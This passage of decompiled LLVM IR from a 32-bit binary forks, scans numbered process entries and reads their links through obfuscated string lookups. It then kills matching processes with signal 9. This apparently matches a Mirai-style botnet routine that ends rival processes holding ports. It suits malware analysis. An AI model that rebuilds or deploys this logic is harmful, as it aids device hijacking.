dec_label_pc_f4b0:                                ; preds = %dec_label_pc_f7cc, %dec_label_pc_f4a8
  %v0_f4b475 = phi i32 [ %v1_f7cc, %dec_label_pc_f7cc ], [ %v0_f7cc, %dec_label_pc_f4a8 ]
  br label %dec_label_pc_f4b4

dec_label_pc_f4b4:                                ; preds = %.thread23, %.thread23.thread35, %dec_label_pc_f4b0
  %v0_f4b4 = phi i32 [ %v0_f7cc, %.thread23.thread35 ], [ %v0_f7cc, %.thread23 ], [ %v0_f4b475, %dec_label_pc_f4b0 ]
  %v0_f4a8.pr68 = phi i32 [ 1, %.thread23.thread35 ], [ 1, %.thread23 ], [ 0, %dec_label_pc_f4b0 ]
  %v7_f4bc = icmp sgt i32 %v0_f4b4, 6
  br i1 %v7_f4bc, label %dec_label_pc_f4c0, label %dec_label_pc_f480.backedge

dec_label_pc_f4c0:                                ; preds = %dec_label_pc_f480.backedge, %dec_label_pc_f4b4, %dec_label_pc_f480.preheader
  %v1_f510 = phi i32 [ %v1_f48852, %dec_label_pc_f480.preheader ], [ %v1_f488, %dec_label_pc_f480.backedge ], [ %v0_f48878, %dec_label_pc_f4b4 ]
  %v0_f4c0 = phi i32 [ %v1_f468, %dec_label_pc_f480.preheader ], [ %v0_f4c081, %dec_label_pc_f480.backedge ], [ %v0_f4c082, %dec_label_pc_f4b4 ]
  %v2_f4c0 = icmp eq i32 %v0_f4c0, 0
  br i1 %v2_f4c0, label %dec_label_pc_f398.backedge, label %dec_label_pc_f4cc

dec_label_pc_f4cc:                                ; preds = %dec_label_pc_f4c0
  %v2_f4d4 = add i32 %v1_f510, %v2_f3f8
  %v1_f4d8 = add i32 %v2_f4d4, -545
  %v2_f4d8 = inttoptr i32 %v1_f4d8 to i8*
  %v3_f4d8 = load i8, i8* %v2_f4d8, align 1
  %v2_f4dc = icmp eq i8 %v3_f4d8, 0
  br i1 %v2_f4dc, label %dec_label_pc_f50c, label %bb131

bb131:                                            ; preds = %dec_label_pc_f4cc
  %v8_f4e0 = icmp eq i8 %v3_f4d8, 32
  br i1 %v8_f4e0, label %dec_label_pc_f50c, label %dec_label_pc_f4e8

dec_label_pc_f4e8:                                ; preds = %bb131
  %v2_f4e8 = add i32 %v1_f510, %v1_f46c
  br label %dec_label_pc_f4ec

dec_label_pc_f4ec:                                ; preds = %bb132, %dec_label_pc_f4e8
  %v0_f4f828 = phi i32 [ %v1_f4f8, %bb132 ], [ %v1_f510, %dec_label_pc_f4e8 ]
  %v0_f4ec = phi i32 [ %v1_f4ec, %bb132 ], [ %v2_f4e8, %dec_label_pc_f4e8 ]
  %v1_f4ec = add i32 %v0_f4ec, 1
  %v2_f4ec = inttoptr i32 %v1_f4ec to i8*
  %v3_f4ec = load i8, i8* %v2_f4ec, align 1
  %v2_f4f0 = icmp eq i8 %v3_f4ec, 0
  br i1 %v2_f4f0, label %.thread27, label %bb132

.thread27:                                        ; preds = %dec_label_pc_f4ec
  %v1_f4f829 = add i32 %v0_f4f828, 1
  br label %dec_label_pc_f500

bb132:                                            ; preds = %dec_label_pc_f4ec
  %v8_f4f4 = icmp eq i8 %v3_f4ec, 32
  %v1_f4f8 = add i32 %v0_f4f828, 1
  br i1 %v8_f4f4, label %dec_label_pc_f500, label %dec_label_pc_f4ec

dec_label_pc_f500:                                ; preds = %bb132, %.thread27
  %v1_f508 = phi i32 [ %v1_f4f829, %.thread27 ], [ %v1_f4f8, %bb132 ]
  %v2_f508 = add i32 %v1_f508, %v2_f3f8
  br label %dec_label_pc_f50c

dec_label_pc_f50c:                                ; preds = %dec_label_pc_f4cc, %bb131, %dec_label_pc_f500
  %v2_f518 = phi i32 [ %v2_f4d4, %dec_label_pc_f4cc ], [ %v2_f4d4, %bb131 ], [ %v2_f508, %dec_label_pc_f500 ]
  %v2_f510 = add i32 %v1_f510, %v1_f46c
  store i32 %v2_f510, i32* @r4, align 4
  %v3_f518 = add i32 %v2_f518, -545
  %v4_f518 = inttoptr i32 %v3_f518 to i8*
  store i8 0, i8* %v4_f518, align 1
  %v1_f51c = inttoptr i32 %v2_f510 to i8*
  %v2_f51c = call i32 @function_12d34(i8* %v1_f51c)
  %v8_f524 = icmp sgt i32 %v2_f51c, 15
  br i1 %v8_f524, label %dec_label_pc_f398.backedge, label %dec_label_pc_f528

dec_label_pc_f528:                                ; preds = %dec_label_pc_f50c
  %v0_f52c = load i32, i32* @r4, align 4
  %v2_f530 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_f530, i32* @r0, align 4
  %v2_f534 = bitcast i32* %stack_var_-52 to i8*
  %v3_f534 = call i32 @function_12d5c(i8* %v2_f534, i32 %v0_f52c)
  br label %dec_label_pc_f538

dec_label_pc_f538.loopexit:                       ; preds = %dec_label_pc_f398.backedge, %dec_label_pc_f398.preheader
  %.pre = ptrtoint i32* %stack_var_-52 to i32
  %.pre94 = bitcast i32* %stack_var_-52 to i8*
  br label %dec_label_pc_f538

dec_label_pc_f538:                                ; preds = %dec_label_pc_f538.loopexit, %dec_label_pc_f528
  %v1_f548.pre-phi = phi i8* [ %.pre94, %dec_label_pc_f538.loopexit ], [ %v2_f534, %dec_label_pc_f528 ]
  %v2_f544.pre-phi = phi i32 [ %.pre, %dec_label_pc_f538.loopexit ], [ %v2_f530, %dec_label_pc_f528 ]
  %v0_f538 = load i32, i32* @r8, align 4
  %v1_f53c = call i32 @close(i32 %v0_f538)
  %v2_f548 = call i32 @function_12d34(i8* %v1_f548.pre-phi)
  store i32 %v2_f548, i32* @r4, align 4
  %v2_f54c = icmp eq i32 %v2_f548, 0
  br i1 %v2_f54c, label %dec_label_pc_f79c, label %dec_label_pc_f554

dec_label_pc_f554:                                ; preds = %dec_label_pc_f538
  %v3_f55c = call i32 @function_1219c(i32 6, i32* null)
  %v4_f55c = inttoptr i32 %v3_f55c to i8*
  %v3_f560 = call %__dirstream* @opendir(i8* %v4_f55c)
  %v5_f560 = ptrtoint %__dirstream* %v3_f560 to i32
  store i32 %v5_f560, i32* @r8, align 4
  %v2_f564 = icmp eq %__dirstream* %v3_f560, null
  br i1 %v2_f564, label %dec_label_pc_f794, label %dec_label_pc_f574.preheader

dec_label_pc_f574.preheader:                      ; preds = %dec_label_pc_f554
  store i32 0, i32* @r5, align 4
  %v3_f57841 = call %dirent* @readdir(%__dirstream* nonnull %v3_f560)
  %v2_f57c44 = icmp eq %dirent* %v3_f57841, null
  br i1 %v2_f57c44, label %dec_label_pc_f788, label %dec_label_pc_f584.preheader.lr.ph

dec_label_pc_f584.preheader.lr.ph:                ; preds = %dec_label_pc_f574.preheader
  %v2_f5b4 = bitcast i32* %stack_var_-4677 to i8*
  %tmp134 = bitcast i32* %stack_var_-8773 to i8*
  br label %dec_label_pc_f584.preheader

dec_label_pc_f574.loopexit:                       ; preds = %dec_label_pc_f58c, %dec_label_pc_f5a0, %dec_label_pc_f608
  %v0_f574 = load i32, i32* @r8, align 4
  %v1_f574 = inttoptr i32 %v0_f574 to %__dirstream*
  %v3_f578 = call %dirent* @readdir(%__dirstream* %v1_f574)
  %v2_f57c = icmp eq %dirent* %v3_f578, null
  br i1 %v2_f57c, label %dec_label_pc_f788, label %dec_label_pc_f584.preheader

dec_label_pc_f584.preheader:                      ; preds = %dec_label_pc_f584.preheader.lr.ph, %dec_label_pc_f574.loopexit
  %v0_f58c90.in = phi %dirent* [ %v3_f57841, %dec_label_pc_f584.preheader.lr.ph ], [ %v3_f578, %dec_label_pc_f574.loopexit ]
  br label %dec_label_pc_f584

dec_label_pc_f584:                                ; preds = %dec_label_pc_f584.preheader, %dec_label_pc_f770
  %v0_f598.in = phi %dirent* [ %v0_f58c90.in, %dec_label_pc_f584.preheader ], [ %v3_f77c, %dec_label_pc_f770 ]
  %v0_f584 = load i32, i32* @r5, align 4
  %v2_f584 = icmp eq i32 %v0_f584, 0
  br i1 %v2_f584, label %dec_label_pc_f58c, label %dec_label_pc_f788

dec_label_pc_f58c:                                ; preds = %dec_label_pc_f584
  %v0_f598 = ptrtoint %dirent* %v0_f598.in to i32
  %v1_f58c = add i32 %v0_f598, 11
  %v2_f58c = inttoptr i32 %v1_f58c to i8*
  %v3_f58c = load i8, i8* %v2_f58c, align 1
  %v4_f58c = zext i8 %v3_f58c to i32
  %v1_f590 = add nsw i32 %v4_f58c, -48
  store i32 %v1_f58c, i32* @r7, align 4
  %tmp = icmp ugt i32 %v1_f590, 9
  br i1 %tmp, label %dec_label_pc_f574.loopexit, label %dec_label_pc_f5a0

dec_label_pc_f5a0:                                ; preds = %dec_label_pc_f58c
  %v3_f5a8 = call i32 @function_1219c(i32 6, i32* null)
  store i32 %v2_f2bc, i32* @r0, align 4
  %v3_f5b4 = call i32 @function_12d5c(i8* %v2_f5b4, i32 %v3_f5a8)
  %v2_f5bc = call i32 @function_12d34(i8* %v2_f5b4)
  %v0_f5c0 = load i32, i32* @r7, align 4
  %v0_f5c4 = load i32, i32* @sl, align 4
  %v2_f5c4 = add i32 %v0_f5c4, %v2_f5bc
  store i32 %v2_f5c4, i32* @r0, align 4
  %v2_f5c8 = inttoptr i32 %v2_f5c4 to i8*
  %v3_f5c8 = call i32 @function_12d5c(i8* %v2_f5c8, i32 %v0_f5c0)
  %v2_f5d0 = call i32 @function_12d34(i8* %v2_f5b4)
  %v0_f5d4 = load i32, i32* @r5, align 4
  store i32 %v2_f5d0, i32* %r4.global-to-local, align 4
  %v2_f5e0 = inttoptr i32 %v0_f5d4 to i32*
  %v3_f5e0 = call i32 @function_1219c(i32 7, i32* %v2_f5e0)
  %v0_f5e8 = load i32, i32* @sl, align 4
  %v2_f5e8 = add i32 %v2_f5d0, %v0_f5e8
  store i32 %v2_f5e8, i32* @r0, align 4
  %v2_f5ec = inttoptr i32 %v2_f5e8 to i8*
  %v3_f5ec = call i32 @function_12d5c(i8* %v2_f5ec, i32 %v3_f5e0)
  %v7_f5fc = call i32 @readlink(i8* %v2_f5b4, i8* %tmp134, i32 4096)
  %v7_f600 = icmp eq i32 %v7_f5fc, -1
  br i1 %v7_f600, label %dec_label_pc_f574.loopexit, label %dec_label_pc_f608

dec_label_pc_f608:                                ; preds = %dec_label_pc_f5a0
  %v0_f608 = load i32, i32* @r5, align 4
  %v2_f610 = inttoptr i32 %v0_f608 to i32*
  %v3_f610 = call i32 @function_1219c(i32 6, i32* %v2_f610)
  store i32 %v2_f2bc, i32* @r0, align 4
  %v3_f61c = call i32 @function_12d5c(i8* %v2_f5b4, i32 %v3_f610)
  %v2_f624 = call i32 @function_12d34(i8* %v2_f5b4)
  %v0_f628 = load i32, i32* @r7, align 4
  %v0_f62c = load i32, i32* @sl, align 4
  %v2_f62c = add i32 %v0_f62c, %v2_f624
  store i32 %v2_f62c, i32* @r0, align 4
  %v2_f630 = inttoptr i32 %v2_f62c to i8*
  %v3_f630 = call i32 @function_12d5c(i8* %v2_f630, i32 %v0_f628)
  %v2_f638 = call i32 @function_12d34(i8* %v2_f5b4)
  %v0_f63c = load i32, i32* @r5, align 4
  store i32 %v2_f638, i32* %r4.global-to-local, align 4
  %v2_f648 = inttoptr i32 %v0_f63c to i32*
  %v3_f648 = call i32 @function_1219c(i32 8, i32* %v2_f648)
  %v0_f650 = load i32, i32* @sl, align 4
  %v2_f650 = add i32 %v2_f638, %v0_f650
  store i32 %v2_f650, i32* @r0, align 4
  %v2_f654 = inttoptr i32 %v2_f650 to i8*
  %v3_f654 = call i32 @function_12d5c(i8* %v2_f654, i32 %v3_f648)
  %v3_f65c = call %__dirstream* @opendir(i8* %v2_f5b4)
  %v5_f65c = ptrtoint %__dirstream* %v3_f65c to i32
  store i32 %v5_f65c, i32* %sb.global-to-local, align 4
  %v2_f660 = icmp eq %__dirstream* %v3_f65c, null
  br i1 %v2_f660, label %dec_label_pc_f574.loopexit, label %dec_label_pc_f668.preheader

dec_label_pc_f668.preheader:                      ; preds = %dec_label_pc_f608
  %v3_f66c140 = call %dirent* @readdir(%__dirstream* nonnull %v3_f65c)
  %v5_f66c141 = ptrtoint %dirent* %v3_f66c140 to i32
  store i32 %v5_f66c141, i32* @r6, align 4
  %v2_f670143 = icmp eq %dirent* %v3_f66c140, null
  br i1 %v2_f670143, label %dec_label_pc_f770, label %dec_label_pc_f680thread-pre-split

dec_label_pc_f668.loopexit:                       ; preds = %dec_label_pc_f688, %dec_label_pc_f720
  %v0_f668.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_f668 = inttoptr i32 %v0_f668.pre to %__dirstream*
  %v3_f66c = call %dirent* @readdir(%__dirstream* %v1_f668)
  %v5_f66c = ptrtoint %dirent* %v3_f66c to i32
  store i32 %v5_f66c, i32* @r6, align 4
  %v2_f670 = icmp eq %dirent* %v3_f66c, null
  br i1 %v2_f670, label %dec_label_pc_f770, label %dec_label_pc_f680thread-pre-split

dec_label_pc_f680thread-pre-split:                ; preds = %dec_label_pc_f668.preheader, %dec_label_pc_f668.loopexit
  %v0_f680.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_f680

dec_label_pc_f680:                                ; preds = %dec_label_pc_f680thread-pre-split, %dec_label_pc_f748
  %v0_f680 = phi i32 [ %v0_f680.pr, %dec_label_pc_f680thread-pre-split ], [ 1, %dec_label_pc_f748 ]
  %v2_f680 = icmp eq i32 %v0_f680, 0
  br i1 %v2_f680, label %dec_label_pc_f688, label %dec_label_pc_f770

dec_label_pc_f688:                                ; preds = %dec_label_pc_f680
  %v2_f688 = call i32 @function_12dd4(i32 %v2_f2d0, i32 4096)
  %v0_f68c = load i32, i32* @r5, align 4
  %v2_f694 = inttoptr i32 %v0_f68c to i32*
  %v3_f694 = call i32 @function_1219c(i32 6, i32* %v2_f694)
  store i32 %v2_f2bc, i32* @r0, align 4
  %v3_f6a0 = call i32 @function_12d5c(i8* %v2_f5b4, i32 %v3_f694)
  %v2_f6a8 = call i32 @function_12d34(i8* %v2_f5b4)
  %v0_f6ac = load i32, i32* @r7, align 4
  %v0_f6b0 = load i32, i32* @sl, align 4
  %v2_f6b0 = add i32 %v0_f6b0, %v2_f6a8
  store i32 %v2_f6b0, i32* @r0, align 4
  %v2_f6b4 = inttoptr i32 %v2_f6b0 to i8*
  %v3_f6b4 = call i32 @function_12d5c(i8* %v2_f6b4, i32 %v0_f6ac)
  %v2_f6bc = call i32 @function_12d34(i8* %v2_f5b4)
  %v0_f6c0 = load i32, i32* @r5, align 4
  store i32 %v2_f6bc, i32* @r4, align 4
  %v2_f6cc = inttoptr i32 %v0_f6c0 to i32*
  %v3_f6cc = call i32 @function_1219c(i32 8, i32* %v2_f6cc)
  %v0_f6d4 = load i32, i32* @sl, align 4
  %v1_f6d4 = load i32, i32* @r4, align 4
  %v2_f6d4 = add i32 %v1_f6d4, %v0_f6d4
  store i32 %v2_f6d4, i32* @r0, align 4
  %v2_f6d8 = inttoptr i32 %v2_f6d4 to i8*
  %v3_f6d8 = call i32 @function_12d5c(i8* %v2_f6d8, i32 %v3_f6cc)
  %v2_f6e0 = call i32 @function_12d34(i8* %v2_f5b4)
  %v0_f6e8 = load i32, i32* @sl, align 4
  %v2_f6e8 = add i32 %v0_f6e8, %v2_f6e0
  store i32 %v2_f6e8, i32* @r0, align 4
  %v2_f6ec = inttoptr i32 %v2_f6e8 to i8*
  %v3_f6ec = call i32 @function_12d5c(i8* %v2_f6ec, i32 ptrtoint (i32* @global_var_13698.75 to i32))
  %v2_f6f4 = call i32 @function_12d34(i8* %v2_f5b4)
  %v0_f6f8 = load i32, i32* @r6, align 4
  %v1_f6f8 = add i32 %v0_f6f8, 11
  %v0_f6fc = load i32, i32* @sl, align 4
  %v2_f6fc = add i32 %v0_f6fc, %v2_f6f4
  store i32 %v2_f6fc, i32* @r0, align 4
  %v2_f700 = inttoptr i32 %v2_f6fc to i8*
  %v3_f700 = call i32 @function_12d5c(i8* %v2_f700, i32 %v1_f6f8)
  %v7_f710 = call i32 @readlink(i8* %v2_f5b4, i8* %tmp134, i32 4096)
  %v7_f714 = icmp eq i32 %v7_f710, -1
  br i1 %v7_f714, label %dec_label_pc_f668.loopexit, label %dec_label_pc_f720

dec_label_pc_f720:                                ; preds = %dec_label_pc_f688
  %v2_f720 = call i32 @function_12d34(i8* %tmp134)
  store i32 %v2_f720, i32* @r1, align 4
  %v4_f734 = call i32 @function_13088(i8* %tmp134, i32 %v2_f720, i32 %v2_f544.pre-phi)
  %v7_f738 = icmp eq i32 %v4_f734, -1
  br i1 %v7_f738, label %dec_label_pc_f668.loopexit, label %dec_label_pc_f748

dec_label_pc_f748:                                ; preds = %dec_label_pc_f720
  %v0_f740 = load i32, i32* @r7, align 4
  %v2_f748 = inttoptr i32 %v0_f740 to i8*
  %v3_f748 = call i32 @function_12e60(i8* %v2_f748, i32 10)
  %v2_f750 = call i32 @kill(i32 %v3_f748, i32 9)
  %v0_f754 = load i32, i32* %sb.global-to-local, align 4
  %v1_f754 = inttoptr i32 %v0_f754 to %__dirstream*
  %v3_f758 = call %dirent* @readdir(%__dirstream* %v1_f754)
  %v5_f758 = ptrtoint %dirent* %v3_f758 to i32
  store i32 %v5_f758, i32* @r6, align 4
  %v2_f75c = icmp eq %dirent* %v3_f758, null
  store i32 1, i32* @r5, align 4
  br i1 %v2_f75c, label %dec_label_pc_f770, label %dec_label_pc_f680

dec_label_pc_f770:                                ; preds = %dec_label_pc_f668.preheader, %dec_label_pc_f668.loopexit, %dec_label_pc_f748, %dec_label_pc_f680
  %v0_f770 = load i32, i32* %sb.global-to-local, align 4
  %v1_f770 = inttoptr i32 %v0_f770 to %__dirstream*
  %v3_f774 = call i32 @closedir(%__dirstream* %v1_f770)
  %v0_f778 = load i32, i32* @r8, align 4
  %v1_f778 = inttoptr i32 %v0_f778 to %__dirstream*
  %v3_f77c = call %dirent* @readdir(%__dirstream* %v1_f778)
  %v2_f780 = icmp eq %dirent* %v3_f77c, null
  br i1 %v2_f780, label %dec_label_pc_f788, label %dec_label_pc_f584

dec_label_pc_f788:                                ; preds = %dec_label_pc_f574.loopexit, %dec_label_pc_f770, %dec_label_pc_f584, %dec_label_pc_f574.preheader
  %v0_f788 = load i32, i32* @r8, align 4
  %v1_f788 = inttoptr i32 %v0_f788 to %__dirstream*
  %v3_f78c = call i32 @closedir(%__dirstream* %v1_f788)
  %v0_f790 = load i32, i32* @r5, align 4
  %v1_f790 = urem i32 %v0_f790, 256
  br label %dec_label_pc_f794

dec_label_pc_f794:                                ; preds = %dec_label_pc_f554, %dec_label_pc_f788
  %storemerge = phi i32 [ %v1_f790, %dec_label_pc_f788 ], [ %v5_f560, %dec_label_pc_f554 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_f798 = call i32 @sleep(i32 1)
  br label %dec_label_pc_f79c

dec_label_pc_f79c:                                ; preds = %dec_label_pc_f538, %dec_label_pc_f794
  %v1_f7a0 = call i32 @function_121c8(i32 6)
  %v1_f7a8 = call i32 @function_121c8(i32 7)
  %v1_f7b0 = call i32 @function_121c8(i32 8)
  %v1_f7b8 = call i32 @function_121c8(i32 9)
  br label %dec_label_pc_f7bc

dec_label_pc_f7bc:                                ; preds = %dec_label_pc_f358, %dec_label_pc_f79c
  %v0_f7bc = load i32, i32* @r4, align 4
  %v2_f7c8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_f7c8, i32* @r4, align 4
  store i32 %v6_f2a8, i32* @r5, align 4
  store i32 %v9_f2a8, i32* @r6, align 4
  store i32 %v12_f2a8, i32* @r7, align 4
  store i32 %v15_f2a8, i32* @r8, align 4
  store i32 %v21_f2a8, i32* @sl, align 4
  ret i32 %v0_f7bc

dec_label_pc_f7cc:                                ; preds = %dec_label_pc_f4a8
  %v1_f7cc = add i32 %v0_f7cc, 1
  %v7_f7d0 = icmp eq i32 %v0_f7cc, 0
  br i1 %v7_f7d0, label %dec_label_pc_f7d8, label %dec_label_pc_f4b0

dec_label_pc_f7d8:                                ; preds = %dec_label_pc_f7cc
  %v1_f7d8 = add i32 %v0_f4b8, 3
  %v2_f7d8 = inttoptr i32 %v1_f7d8 to i8*
  %v3_f7d8 = load i8, i8* %v2_f7d8, align 1
  %v7_f7dc = icmp eq i8 %v3_f7d8, 65
  br i1 %v7_f7dc, label %dec_label_pc_f7ec, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_f7d8
  br label %dec_label_pc_f480.backedge

dec_label_pc_f7ec:                                ; preds = %dec_label_pc_f7d8
  store i32 %v1_f7cc, i32* @r4, align 4
  br label %dec_label_pc_f480.backedge

dec_label_pc_f480.backedge:                       ; preds = %.thread33, %dec_label_pc_f7ec, %dec_label_pc_f4b4
  %v0_f4c081 = phi i32 [ %v1_f7cc, %dec_label_pc_f7ec ], [ %v0_f4c082, %dec_label_pc_f4b4 ], [ %v0_f4c082, %.thread33 ]
  %v0_f7cc70 = phi i32 [ %v1_f7cc, %dec_label_pc_f7ec ], [ %v0_f4b4, %dec_label_pc_f4b4 ], [ %v1_f7cc, %.thread33 ]
  %v0_f4a8.pr67 = phi i32 [ 0, %dec_label_pc_f7ec ], [ %v0_f4a8.pr68, %dec_label_pc_f4b4 ], [ 0, %.thread33 ]
  %v0_f480 = add i32 %v0_f4b8, 1
  %v1_f480 = add i32 %v0_f4b8, 3
  %v2_f480 = inttoptr i32 %v1_f480 to i8*
  %v3_f480 = load i8, i8* %v2_f480, align 1
  %v2_f484 = icmp eq i8 %v3_f480, 0
  %v1_f488 = add i32 %v0_f48878, 1
  br i1 %v2_f484, label %dec_label_pc_f4c0, label %dec_label_pc_f490

dec_label_pc_f7fc:                                ; preds = %dec_label_pc_f2a8
  store i8 48, i8* %stack_var_-68, align 1
  br label %dec_label_pc_f358

; uselistorder directives
  uselistorder i32 %v1_f488, { 1, 0 }
  uselistorder i8 %v3_f480, { 1, 0 }
  uselistorder i32 %v0_f4c081, { 1, 0 }
  uselistorder i32 %v1_f7cc, { 4, 3, 0, 2, 1 }
  uselistorder %dirent* %v3_f77c, { 1, 0 }
  uselistorder i8* %tmp134, { 1, 0, 2, 3 }
  uselistorder i32 %v1_f4ec, { 1, 0 }
  uselistorder i32 %v0_f4f828, { 1, 0 }
  uselistorder i32 %v1_f510, { 0, 3, 1, 2 }
  uselistorder i32 %v0_f4b4, { 1, 0 }
  uselistorder i32 %v0_f48878, { 1, 0 }
  uselistorder i32 %v0_f7cc, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_f4c082, { 1, 2, 0 }
  uselistorder i32 %v1_f48852, { 1, 0 }
  uselistorder i32 %v2_f46c, { 1, 0 }
  uselistorder i32 %v1_f468, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v0_f42413, { 1, 0, 2 }
  uselistorder i32 %v0_f414, { 1, 0 }
  uselistorder i32 %v1_f3f4, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v4_f388, { 1, 2, 0 }
  uselistorder i32* %v3_f318, { 1, 0, 2 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8773, { 1, 0, 2 }
  uselistorder i8* %stack_var_-581, { 2, 0, 1 }
  uselistorder i8* %stack_var_-68, { 2, 0, 1 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 4, 3 }
  uselistorder i32* %sb.global-to-local, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 47, { 5, 6, 7, 8, 1, 9, 2, 10, 0, 11, 12, 3, 13, 4 }
  uselistorder i32 (i32*, i32, i32)* @function_12f8c, { 1, 0 }
  uselistorder i32* (i32*, i32, i32)* @memset, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_f480.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f7bc, { 1, 0 }
  uselistorder label %dec_label_pc_f79c, { 1, 0 }
  uselistorder label %dec_label_pc_f794, { 1, 0 }
  uselistorder label %dec_label_pc_f788, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_f770, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_f680, { 1, 0 }
  uselistorder label %dec_label_pc_f680thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_f668.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_f584, { 1, 0 }
  uselistorder label %dec_label_pc_f584.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_f574.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f50c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f4b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f490, { 1, 0 }
  uselistorder label %dec_label_pc_f434, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f398.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_f3e8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f3b0, { 1, 0 }
  uselistorder label %dec_label_pc_f358, { 1, 0 }
}

define i32 @function_f828(i32 %arg1) local_unnamed_addr {
dec_label_pc_f828:
  %fp.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-628 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-632 = alloca i32, align 4
  %v3_f828 = load i32, i32* @r4, align 4
  %v6_f828 = load i32, i32* @r5, align 4
  %v9_f828 = load i32, i32* @r6, align 4
  %v12_f828 = load i32, i32* @r7, align 4
  %v15_f828 = load i32, i32* @r8, align 4
  %v21_f828 = load i32, i32* @sl, align 4
  %v2_f834 = call i32 @time(i32* null)
  store i32 %v2_f834, i32* @r6, align 4
  %v0_f83c = call i32 @fork()
  %v7_f840 = icmp eq i32 %v0_f83c, -1
  %. = zext i1 %v7_f840 to i32
  %tmp57 = icmp slt i32 %v0_f83c, 1
  %storemerge38 = select i1 %tmp57, i32 %., i32 1
  store i32 %storemerge38, i32* @r4, align 4
  %v2_f85c = icmp eq i32 %storemerge38, 0
  store i32 %v0_f83c, i32* @global_var_1c1c4.146, align 4
  br i1 %v2_f85c, label %dec_label_pc_f870, label %dec_label_pc_f868

dec_label_pc_f868:                                ; preds = %dec_label_pc_f8cc, %dec_label_pc_f828
  %v29_f86c = phi i32 [ %v0_f83c, %dec_label_pc_f828 ], [ %v5_f8e0, %dec_label_pc_f8cc ]
  store i32 %v3_f828, i32* @r4, align 4
  store i32 %v6_f828, i32* @r5, align 4
  store i32 %v9_f828, i32* @r6, align 4
  store i32 %v12_f828, i32* @r7, align 4
  store i32 %v15_f828, i32* @r8, align 4
  store i32 %v21_f828, i32* @sl, align 4
  ret i32 %v29_f86c

dec_label_pc_f870:                                ; preds = %dec_label_pc_f828
  store i32 2, i32* @r5, align 4
  store i32 2, i32* %stack_var_-52, align 4
  %v1_f884 = call i32 @function_f2a8(i32 20736)
  %v2_f888 = icmp eq i32 %v1_f884, 0
  br i1 %v2_f888, label %dec_label_pc_f890, label %dec_label_pc_fae4

dec_label_pc_f890:                                ; preds = %dec_label_pc_f870, %dec_label_pc_fae4, %dec_label_pc_fb0c
  %v1_f894 = call i32 @sleep(i32 5)
  %v1_f89c = call i32* @malloc(i32 4096)
  %v2_f89c = ptrtoint i32* %v1_f89c to i32
  %tmp60 = bitcast i32* %v1_f89c to i8*
  store i32 %v2_f89c, i32* @global_var_1c220.150, align 4
  store i8 0, i8* %tmp60, align 1
  store i32 0, i32* @global_var_1c1c8.152, align 4
  %v0_f8b8 = load i32, i32* @r6, align 4
  store i32 %v0_f8b8, i32* @r5, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 400, i32* @r6, align 4
  %v2_f8c4 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_f8c4, i32* %fp.global-to-local, align 4
  %v2_f8c8 = ptrtoint i32* %stack_var_-628 to i32
  store i32 %v2_f8c8, i32* @r8, align 4
  %v2_f9bc = bitcast i32* %stack_var_-116 to i8*
  br label %dec_label_pc_f8cc

dec_label_pc_f8cc:                                ; preds = %dec_label_pc_f980, %dec_label_pc_f890
  %v1_f8d0 = call i32 @function_12280(i32 6)
  %v3_f8dc = call i32 @function_1219c(i32 6, i32* null)
  %v4_f8dc = inttoptr i32 %v3_f8dc to i8*
  %v3_f8e0 = call %__dirstream* @opendir(i8* %v4_f8dc)
  %v5_f8e0 = ptrtoint %__dirstream* %v3_f8e0 to i32
  store i32 %v5_f8e0, i32* @sl, align 4
  %v2_f8e4 = icmp eq %__dirstream* %v3_f8e0, null
  br i1 %v2_f8e4, label %dec_label_pc_f868, label %dec_label_pc_f8ec

dec_label_pc_f8ec:                                ; preds = %dec_label_pc_f8cc
  %v1_f8f0 = call i32 @function_121c8(i32 6)
  %v0_f8f420 = load i32, i32* @sl, align 4
  %v1_f8f421 = inttoptr i32 %v0_f8f420 to %__dirstream*
  %v3_f8f822 = call %dirent* @readdir(%__dirstream* %v1_f8f421)
  %v2_f8fc25 = icmp eq %dirent* %v3_f8f822, null
  br i1 %v2_f8fc25, label %dec_label_pc_f980, label %dec_label_pc_f904.preheader

dec_label_pc_f904.preheader:                      ; preds = %dec_label_pc_f8ec, %dec_label_pc_f8f4.backedge
  %v0_f90430.in = phi %dirent* [ %v3_f8f8, %dec_label_pc_f8f4.backedge ], [ %v3_f8f822, %dec_label_pc_f8ec ]
  br label %dec_label_pc_f904

dec_label_pc_f904:                                ; preds = %dec_label_pc_f904.preheader, %dec_label_pc_f968
  %v0_f914.in = phi %dirent* [ %v0_f90430.in, %dec_label_pc_f904.preheader ], [ %v3_f974, %dec_label_pc_f968 ]
  %v0_f914 = ptrtoint %dirent* %v0_f914.in to i32
  %v1_f904 = add i32 %v0_f914, 11
  %v2_f904 = inttoptr i32 %v1_f904 to i8*
  %v3_f904 = load i8, i8* %v2_f904, align 1
  %v4_f904 = zext i8 %v3_f904 to i32
  %v1_f908 = add nsw i32 %v4_f904, -48
